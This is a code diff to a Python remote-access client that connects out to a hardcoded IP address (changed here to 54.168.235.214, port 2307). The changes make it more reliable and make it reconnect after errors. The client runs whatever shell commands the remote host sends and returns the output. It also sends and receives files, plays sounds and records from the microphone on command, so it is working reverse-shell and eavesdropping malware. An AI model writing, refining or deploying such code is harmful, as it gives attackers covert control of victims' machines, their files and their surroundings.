@@ -1210,7 +1210,7 @@ def Record(filename,duration):
 
 class Client:
 
-    def __init__(self,host="18.217.85.9",port=2307):
+    def __init__(self,host="54.168.235.214",port=2307):
         self.socket_obj = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket_obj.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.host = host
@@ -1235,7 +1235,7 @@ def RecvFile(conn,chunk_size=404800):
     file_size = str(file_size,"utf-8")[:-1:]
     if file_size.isnumeric():
         file_size = int(file_size) 
-        conn.send( str.encode("OK") )
+        conn.sendall( str.encode("OK") )
     else:
         return False
 
@@ -1247,7 +1247,7 @@ def RecvFile(conn,chunk_size=404800):
         response = conn.recv( chunk_size if chunk_size < remaining_data else remaining_data )
         while response:
             data_received += response
-            conn.send( str.encode("OK","utf-8") )
+            conn.sendall( str.encode("OK","utf-8") )
             total_width = 20
             prercentage_completed = ( len(data_received)/file_size)*100
             completed_width = math.ceil( (total_width*prercentage_completed)/100 )
@@ -1271,7 +1271,7 @@ def SendFile(conn,file,chunk_size=404800):
     total_size = os.path.getsize(file.name)
     data_sended = 0
     
-    conn.send( str.encode( str(total_size)+"C", "utf-8" ) ) # Send Size of File to Client
+    conn.sendall( str.encode( str(total_size)+"C", "utf-8" ) ) # Send Size of File to Client
     try:
         response = conn.recv(2)
         if str(response,"utf-8")!="OK":
@@ -1288,7 +1288,7 @@ def SendFile(conn,file,chunk_size=404800):
     print("Sending a {:0.2f} MB file...\n".format( (total_size/1024)/1024 ) )
 
     while data:
-        conn.send( data )
+        conn.sendall( data )
         reponse = conn.recv(2)
         try:
             if str(reponse,"utf-8")=="OK":
@@ -1311,84 +1311,88 @@ def SendFile(conn,file,chunk_size=404800):
             print(msg)
             return False
 
+def main():
+    try:
+        client = Client()
+        client.connect()
 
+        while True: 
+            data = client.socket_obj.recv(1024)
+            
+            #ALL MANUAL COMMANDS which are starting from -
+            if data[:1].decode("utf-8") == "-": 
+                command = data[1:].decode("utf-8").strip()            
+
+                # For Receiving Files  
+                if re.fullmatch("recv_file [\w.]+",command)!=None:
+                    filename = re.fullmatch("recv_file ([\w.]+)",command).group(1)
+                    if not os.path.exists('files'):
+                        os.makedirs('files')
+                    data = RecvFile(client.socket_obj)
+
+                    if data:
+                        # create a new file and write recived data init
+                        with open("files/{}".format(filename),"wb") as file:
+                            file.write( data )
+
+                # For Sending Files
+                elif re.fullmatch("send_file [\w.]+",command)!=None:
+                    filename = re.fullmatch("send_file ([\w.]+)",command).group(1)
+                    if os.path.isfile( os.getcwd()+ "/" +filename): #Check if file exists or not
+                        client.socket_obj.sendall( str.encode( "file_found|{}".format( os.getcwd()+"> " ), "utf-8") )
+                        with open( os.getcwd()+ "/" +filename, "rb" ) as file:
+                            SendFile(client.socket_obj,file)
+                    else:
+                        client.socket_obj.sendall( str.encode( "file_not_found|{}".format( os.getcwd()+"> " ), "utf-8") )
+
+                #  Play Sound Files
+                elif re.fullmatch("play [\w.:]+",command)!=None:
+                    filename = re.fullmatch("play ([\w.:]+)",command).group(1)
+                    try:
+                        client.socket_obj.sendall( str.encode("playing","utf-8") )
+                        Play("{}".format(filename))
+                        client.socket_obj.sendall( str.encode( "{}\n{}> ".format( "Completed", os.getcwd() )  , "utf-8") )
+                    except Exception as msg:
+                        client.socket_obj.sendall( str.encode( "{}\n{}> ".format( str(msg), os.getcwd() )  , "utf-8") ) 
+                
+                # Record for some seconds then send file to server
+                elif re.fullmatch("record [1-9]\d*",command)!=None:
+                    duration = int( re.fullmatch("record ([1-9]\d*)",command).group(1) )
+                    try:
+                        client.socket_obj.sendall( str.encode("recording","utf-8") )
+                        filename = datetime.now().strftime("%d_%m_%Y_%H_%M_%S")
+                        Record("{}".format(filename),duration=duration)
+                        client.socket_obj.sendall( str.encode( "{}\n{}> ".format( "Completed", os.getcwd() )  , "utf-8") )
+                    except Exception as msg:
+                        client.socket_obj.sendall( str.encode( "{}\n{}> ".format( str(msg), os.getcwd() )  , "utf-8") ) 
+
+
+
+
+            elif data[:2].decode("utf-8") == "cd":
+                try:
+                    os.chdir( data[3:].decode("utf-8") )
+                    output_str = os.getcwd() + "> "
+                    client.socket_obj.sendall( str.encode(output_str) )
+                except os.error as msg:
+                    output_str =  str(msg) + "\n" + os.getcwd() + "> "
+                    client.socket_obj.sendall( str.encode(output_str) )
+
+            elif len(data) > 0:
+                cmd = subprocess.Popen( 
+                                        data.decode("utf-8"), 
+                                        shell=True, 
+                                        stdout=subprocess.PIPE, 
+                                        stdin=subprocess.PIPE, 
+                                        stderr=subprocess.PIPE 
+                                    )
+
+                output_byte = cmd.stdout.read() + cmd.stderr.read()
+                output_str =  str(output_byte,"utf-8") + os.getcwd() + "> "
+                client.socket_obj.sendall( str.encode(output_str) )
+    except socket.error as e:
+        print("==> Error: ", e)
+        main()
 
 if __name__=="__main__":
-    client = Client()
-    client.connect()
-
-    while True:
-        data = client.socket_obj.recv(1024)
-        
-        #ALL MANUAL COMMANDS which are starting from -
-        if data[:1].decode("utf-8") == "-": 
-            command = data[1:].decode("utf-8").strip()            
-
-            # For Receiving Files  
-            if re.fullmatch("recv_file [\w.]+",command)!=None:
-                filename = re.fullmatch("recv_file ([\w.]+)",command).group(1)
-                if not os.path.exists('files'):
-                    os.makedirs('files')
-                data = RecvFile(client.socket_obj)
-
-                if data:
-                    # create a new file and write recived data init
-                    with open("files/{}".format(filename),"wb") as file:
-                        file.write( data )
-
-            # For Sending Files
-            elif re.fullmatch("send_file [\w.]+",command)!=None:
-                filename = re.fullmatch("send_file ([\w.]+)",command).group(1)
-                if os.path.isfile( os.getcwd()+ "/" +filename): #Check if file exists or not
-                    client.socket_obj.send( str.encode( "file_found|{}".format( os.getcwd()+"> " ), "utf-8") )
-                    with open( os.getcwd()+ "/" +filename, "rb" ) as file:
-                        SendFile(client.socket_obj,file)
-                else:
-                    client.socket_obj.send( str.encode( "file_not_found|{}".format( os.getcwd()+"> " ), "utf-8") )
-
-            #  Play Sound Files
-            elif re.fullmatch("play [\w.:]+",command)!=None:
-                filename = re.fullmatch("play ([\w.:]+)",command).group(1)
-                try:
-                    client.socket_obj.send( str.encode("playing","utf-8") )
-                    Play("{}".format(filename))
-                    client.socket_obj.send( str.encode( "{}\n{}> ".format( "Completed", os.getcwd() )  , "utf-8") )
-                except Exception as msg:
-                    client.socket_obj.send( str.encode( "{}\n{}> ".format( str(msg), os.getcwd() )  , "utf-8") ) 
-            
-            # Record for some seconds then send file to server
-            elif re.fullmatch("record [1-9]\d*",command)!=None:
-                duration = int( re.fullmatch("record ([1-9]\d*)",command).group(1) )
-                try:
-                    client.socket_obj.send( str.encode("recording","utf-8") )
-                    filename = datetime.now().strftime("%d_%m_%Y_%H_%M_%S")
-                    Record("{}".format(filename),duration=duration)
-                    client.socket_obj.send( str.encode( "{}\n{}> ".format( "Completed", os.getcwd() )  , "utf-8") )
-                except Exception as msg:
-                    client.socket_obj.send( str.encode( "{}\n{}> ".format( str(msg), os.getcwd() )  , "utf-8") ) 
-
-
-
-
-        elif data[:2].decode("utf-8") == "cd":
-            try:
-                os.chdir( data[3:].decode("utf-8") )
-                output_str = os.getcwd() + "> "
-                client.socket_obj.send( str.encode(output_str) )
-            except os.error as msg:
-                output_str =  str(msg) + "\n" + os.getcwd() + "> "
-                client.socket_obj.send( str.encode(output_str) )
-
-        elif len(data) > 0:
-            cmd = subprocess.Popen( 
-                                    data.decode("utf-8"), 
-                                    shell=True, 
-                                    stdout=subprocess.PIPE, 
-                                    stdin=subprocess.PIPE, 
-                                    stderr=subprocess.PIPE 
-                                )
-
-            output_byte = cmd.stdout.read() + cmd.stderr.read()
-            output_str =  str(output_byte,"utf-8") + os.getcwd() + "> "
-            client.socket_obj.send( str.encode(output_str) )
-
+    main()
